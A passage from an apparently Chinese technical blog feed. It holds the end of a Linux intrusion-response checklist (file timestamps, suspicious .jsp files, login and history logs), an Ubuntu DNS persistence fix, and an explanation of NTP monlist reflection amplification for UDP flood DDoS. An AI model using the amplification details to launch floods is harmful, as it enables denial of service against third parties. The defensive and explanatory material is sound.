title="lastb"></a>lastb</h4><p>输出历史登录用户，包含登录成功和失败</p><h3 id="排查异常开机启动"><a href="#排查异常开机启动" class="headerlink" title="排查异常开机启动"></a>排查异常开机启动</h3><h4 id="开机启动目录-etc-init-d"><a href="#开机启动目录-etc-init-d" class="headerlink" title="开机启动目录&#x2F;etc&#x2F;init.d&#x2F;"></a>开机启动目录&#x2F;etc&#x2F;init.d&#x2F;</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/init.d/</span><br>total 184<br>drwxr-xr-x<span class="hljs-number"> 116 </span>root root<span class="hljs-number"> 4096 </span>Mar <span class="hljs-number"> 2 </span>06:03 ..<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 5 </span>17:08 .<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5607 </span>Jun<span class="hljs-number"> 15 </span><span class="hljs-number"> 2023 </span>mysql<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4579 </span>May<span class="hljs-number"> 31 </span><span class="hljs-number"> 2023 </span>nginx<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 985 </span>Dec <span class="hljs-number"> 2 </span><span class="hljs-number"> 2022 </span>grub-common<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2915 </span>May<span class="hljs-number"> 10 </span><span class="hljs-number"> 2022 </span>apport<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 6871 </span>Mar <span class="hljs-number"> 8 </span><span class="hljs-number"> 2022 </span>udev<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4060 </span>Feb<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>ssh<br></code></pre></td></tr></table></figure><h3 id="排查异常文件"><a href="#排查异常文件" class="headerlink" title="排查异常文件"></a>排查异常文件</h3><p>检查文件内容使用 cat 命令，不会修改文件时间属性，如果使用vim，可能会修改文件时间属性</p><h4 id="文件时间检查"><a href="#文件时间检查" class="headerlink" title="文件时间检查"></a>文件时间检查</h4><p><strong>stat filename 查看文件时间，change&#x2F;最近改动是文件落盘时间</strong></p><p>示例：</p><p>原始文件时间信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <br></code></pre></td></tr></table></figure><p>vim文件wq退出，修改文件modify和change时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# vim <span class="hljs-number">11</span>.txt<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">790640177</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>chmod改变文件属性，会修改Change时间</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># chmod o+x 11.txt</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-x <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># stat 11.txt</span><br>  <span class="hljs-symbol">File:</span> <span class="hljs-number">11</span>.txt<br>  <span class="hljs-symbol">Size:</span> <span class="hljs-number">2</span>         <span class="hljs-symbol">Blocks:</span> <span class="hljs-number">8</span>          <span class="hljs-title class_">IO</span> <span class="hljs-symbol">Block:</span> <span class="hljs-number">4096</span>   regular file<br><span class="hljs-symbol">Device:</span> fc03h/<span class="hljs-number">64515</span>d<span class="hljs-symbol">Inode:</span> <span class="hljs-number">654221</span>      <span class="hljs-symbol">Links:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">Access:</span> (<span class="hljs-number">0645</span>/-rw-r--r-x)  <span class="hljs-symbol">Uid:</span> (    <span class="hljs-number">0</span>/    root)   <span class="hljs-symbol">Gid:</span> (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-symbol">Access:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">30.511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Modify:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">33.786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Change:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">49.314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-symbol">Birth:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">26.983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web访问，会修改access时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0645</span>/-rw-r--r-x)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">46</span>:<span class="hljs-number">17</span>.<span class="hljs-number">408516145</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49</span>.<span class="hljs-number">314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web下载文件到设备，会修改文件的access和change时间，change时间会修改为落盘时间</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs subunit">2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 wget 下载<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# wget http://xx.xx.xx.xx:1234/11.txt<br>-<span class="hljs-string">-2024</span><span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33--  http://xx.xx.xx.xx:1234/11.txt<br>正在连接 xx.xx.xx.xx:1234... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2 [text/plain]<br>正在保存至: “11.txt”<br><br>100%[==============================================================================================================&gt;] 2           --.-K/s 用时 0s<br><br>2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 (279 KB/s) - 已保存 “11.txt” [2/2])<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# stat 11.txt<br>  文件：&quot;11.txt&quot;<br>  大小：2         块：8          IO 块：4096   普通文件<br>设备：fd01h/64769dInode：925677      硬链接：1<br>权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)<br>最近访问：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.000000000 <span class="hljs-string">+0800</span><br>最近更改：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:07:33.000000000 <span class="hljs-string">+0800</span><br>最近改动：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.231719265 <span class="hljs-string">+0800</span><br>创建时间：-<br></code></pre></td></tr></table></figure><h4 id="排查tmp目录"><a href="#排查tmp目录" class="headerlink" title="排查tmp目录"></a>排查tmp目录</h4><p>任意用户可操作的目录，排查是否存在可疑文件</p><p>&#x2F;tmp&#x2F;</p><p>&#x2F;var&#x2F;tmp&#x2F;</p><h4 id="排查近期改动文件"><a href="#排查近期改动文件" class="headerlink" title="排查近期改动文件"></a>排查近期改动文件</h4><h5 id="24小时内被改动文件查找-全局查找"><a href="#24小时内被改动文件查找-全局查找" class="headerlink" title="24小时内被改动文件查找(全局查找)"></a>24小时内被改动文件查找(全局查找)</h5><p>查找24小时内修改过的jsp文件</p><p>find &#x2F; -mtime 0 -name “*.jsp”</p><h5 id="72小时内被新增文件查找-全局查找"><a href="#72小时内被新增文件查找-全局查找" class="headerlink" title="72小时内被新增文件查找(全局查找)"></a>72小时内被新增文件查找(全局查找)</h5><p>查找72小时内新增的文件</p><p>find &#x2F; -ctime 2 -name “*.*“</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-comment"># find / -ctime -2 -name &quot;*.*&quot;</span><br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10143</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10142</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/system/session</span>-<span class="hljs-number">10143</span>.scope.d<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/audit/audit</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220823</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220823</span>.gz<br></code></pre></td></tr></table></figure><h4 id="排查高权限文件"><a href="#排查高权限文件" class="headerlink" title="排查高权限文件"></a>排查高权限文件</h4><h5 id="777权限文件查找"><a href="#777权限文件查找" class="headerlink" title="777权限文件查找"></a>777权限文件查找</h5><p>find &#x2F; -iname “*.jsp” -perm 777</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# find /</span> <span class="hljs-operator">-</span>iname <span class="hljs-string">&quot;*.jsp&quot;</span> <span class="hljs-operator">-</span>perm <span class="hljs-number">777</span><br><span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# ls -lat /</span>tmp<span class="hljs-operator">/</span><span class="hljs-number">1</span>.jsp<br><span class="hljs-operator">-</span>rwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">5</span> <span class="hljs-number">8</span>月  <span class="hljs-number">24</span> <span class="hljs-number">21</span>:<span class="hljs-number">09</span> <span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br></code></pre></td></tr></table></figure><h3 id="排查相关日志"><a href="#排查相关日志" class="headerlink" title="排查相关日志"></a>排查相关日志</h3><h4 id="历史操作命令history"><a href="#历史操作命令history" class="headerlink" title="历史操作命令history"></a>历史操作命令history</h4><p>读取 ~&#x2F;.bash_history ，默认输出格式为：num command</p><p>默认保存1000条</p><p>.bash_history文件权限600，每个用户独有一份</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># ls -lat ~/.bash_history</span><br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3738 </span>8月  <span class="hljs-number"> 7 </span>19:13 /root/.bash_history<br></code></pre></td></tr></table></figure><p>正常情况下是退出bash后会将历史命令信息保存在.bash_history文件中</p><h4 id="root-bash-history"><a href="#root-bash-history" class="headerlink" title="&#x2F;root&#x2F;.bash_history"></a>&#x2F;root&#x2F;.bash_history</h4><p>root 用户 history -w 写入的 history 记录文件</p><h4 id="var-spool-mail-root"><a href="#var-spool-mail-root" class="headerlink" title="&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root"></a>&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</h4><h4 id="var-log-wtmp"><a href="#var-log-wtmp" class="headerlink" title="&#x2F;var&#x2F;log&#x2F;wtmp"></a>&#x2F;var&#x2F;log&#x2F;wtmp</h4><h4 id="检查系统用户登录日志"><a href="#检查系统用户登录日志" class="headerlink" title="检查系统用户登录日志"></a>检查系统用户登录日志</h4><p>日志路径：&#x2F;var&#x2F;log&#x2F;secure</p><h5 id="检查密码登录成功记录"><a href="#检查密码登录成功记录" class="headerlink" title="检查密码登录成功记录"></a>检查密码登录成功记录</h5><p>查看登录成功记录的来源IP判断入侵来源，可以将来源IP进行威胁情报检测，查看IP状态</p><p>cat secure* | grep “Accepted password”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span><span class="hljs-number">-1</span>_1_1_1 <span class="hljs-built_in">log</span>]<span class="hljs-meta"># cat secure* | grep <span class="hljs-string">&quot;Accepted password&quot;</span></span><br>Mar <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">08</span> aliyun<span class="hljs-number">-1</span>_1_1_1 sshd[<span class="hljs-number">14458</span>]: Accepted password <span class="hljs-keyword">for</span> root from <span class="hljs-number">8.3</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span> port <span class="hljs-number">16045</span> ssh2<br></code></pre></td></tr></table></figure><h3 id="命令替换工具busybox"><a href="#命令替换工具busybox" class="headerlink" title="命令替换工具busybox"></a>命令替换工具busybox</h3><p><a href="https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox">https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>secresponse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>secresponse</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu_dns</title>
    <link href="/2024/03/12/network/dns/ubuntu_dns/"/>
    <url>/2024/03/12/network/dns/ubuntu_dns/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Ubuntu16 Ubuntu20 重启后DNS配置丢失</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1、修改 &#x2F;etc&#x2F;systemd&#x2F;resolved.conf 文件，增加 dns信息</p><p>DNS&#x3D;8.8.8.8 114.114.114.114</p><p>2、root身份重启 DNS 服务</p><p>systemctl restart systemd-resolved</p><p>3、root身份设置开机启动</p><p>systemctl enable systemd-resolved</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">(base) root@localhost:/etc/<span class="hljs-params">system</span>d<span class="hljs-comment"># systemctl enable systemd-resolved</span><br>Created symlink from /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/multi-<span class="hljs-literal">user</span>.target.wants/<span class="hljs-params">system</span>d-resolved.service to /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/<span class="hljs-params">system</span>d-resolved.service.<br></code></pre></td></tr></table></figure><p>4、设置新的 &#x2F;etc&#x2F;resolv.conf</p><p>mv &#x2F;etc&#x2F;resolv.conf &#x2F;etc&#x2F;resolv.conf.bak</p><p>ln -s &#x2F;run&#x2F;systemd&#x2F;resolve&#x2F;resolv.conf &#x2F;etc&#x2F;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/etc/systemd</span><span class="hljs-comment"># mv /etc/resolv.conf /etc/resolv.conf.bak</span><br>(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/etc/systemd</span><span class="hljs-comment"># ln -s /run/systemd/resolve/resolv.conf /etc/</span><br>(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/etc/systemd</span><span class="hljs-comment"># ls /etc/resolv.conf</span><br>/etc/resolv.conf<br>(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/etc/systemd</span><span class="hljs-comment"># cat /etc/resolv.conf</span><br><span class="hljs-comment"># This file is managed by systemd-resolved(8). Do not edit.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Third party programs must not access this file directly, but</span><br><span class="hljs-comment"># only through the symlink at /etc/resolv.conf. To manage</span><br><span class="hljs-comment"># resolv.conf(5) in a different way, replace the symlink by a</span><br><span class="hljs-comment"># static file or a different symlink.</span><br><br>nameserver <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span><br>nameserver <span class="hljs-number">114.114</span>.<span class="hljs-number">114.114</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>dns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dns</tag>
      
      <tag>network</tag>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>udp_flood</title>
    <link href="/2024/03/08/security/netSec/ddos/udp_flood/"/>
    <url>/2024/03/08/security/netSec/ddos/udp_flood/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在DDoS攻击中，攻击方式以协议进行划分的话，主要是TCP Flood，UDP Flood，ICMP Flood 等，其中 UDP Flood是最主要也是最常见的流量型攻击方式。</p><p>2021年5月，QUIC正式成为互联网标准协议，针对80、443端口的UDP Flood徒增。</p><h1 id="ntp反射"><a href="#ntp反射" class="headerlink" title="ntp反射"></a>ntp反射</h1><h2 id="放大倍数"><a href="#放大倍数" class="headerlink" title="放大倍数"></a>放大倍数</h2><p>556.9</p><h2 id="协议端口"><a href="#协议端口" class="headerlink" title="协议端口"></a>协议端口</h2><p>协议：UDP</p><p>端口：123</p><h2 id="ntp反射原理"><a href="#ntp反射原理" class="headerlink" title="ntp反射原理"></a>ntp反射原理</h2><h3 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h3><p>ntp(Network Time Protocol)网络时间协议，采用服务器-客户端模型，提供高精度的时间矫正机制，客户端会定时从服务器同步自身时间。</p><p>存在监控(monlist)功能，用于监控NTP服务器。NTP服务器会记录与服务器进行过时间同步的客户端IP，客户端可通过命令获取记录的IP。</p><p>每个NTP服务器可以记录进行过时间同步的最后600个客户端的IP，客户端获取记录的时候，服务器会返回记录的600个客户端IP地址，响应包按照6个IP地址进行分割，最多可以返回100个响应包。</p><h3 id="涉及漏洞-反射放大攻击-CVE-2013-5211"><a href="#涉及漏洞-反射放大攻击-CVE-2013-5211" class="headerlink" title="涉及漏洞-反射放大攻击(CVE-2013-5211)"></a>涉及漏洞-反射放大攻击(CVE-2013-5211)</h3><h4 id="反射含义"><a href="#反射含义" class="headerlink" title="反射含义"></a>反射含义</h4><p>UDP协议是无状态的，不会进行校验请求来源。客户端请求，服务端响应，就是一次交互。正是由于无状态的特点，导致部分低版本的ntp服务器没有针对请求地址的校验机制，可以进行请求地址伪造，将响应内容返回给伪造的请求地址，从而造成对伪造请求地址的攻击。</p><h4 id="放大含义"><a href="#放大含义" class="headerlink" title="放大含义"></a>放大含义</h4><p>由于NTP协议的monlist功能，攻击者利用僵尸主机，同时向NTP服务器发起大量monlist请求，1个monlist请求可造成100个响应数据包。</p><p>通常情况下，每个ntp请求包的大小约为90字节，正常响应包大小也应该为90字节左右，monlist的响应包大小约为482字节，100个响应数据包是48200字节，相比正常响应包放大了500倍。</p><p><img src="/2024/03/08/security/netSec/ddos/udp_flood/image-20240312155532466.png" alt="image-20240312155532466"></p><p><img src="/2024/03/08/security/netSec/ddos/udp_flood/image-20240312160850672.png" alt="image-20240312160850672"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="探测UDP123端口"><a href="#探测UDP123端口" class="headerlink" title="探测UDP123端口"></a>探测UDP123端口</h4><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] 【漏洞分析】DDOS攻防分析（三）——UDP篇  XuepengZ 2021-09-02 14:50<br>链接：<a href="https://www.cnblogs.com/Shepherdzhao/p/15218716.html">https://www.cnblogs.com/Shepherdzhao/p/15218716.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
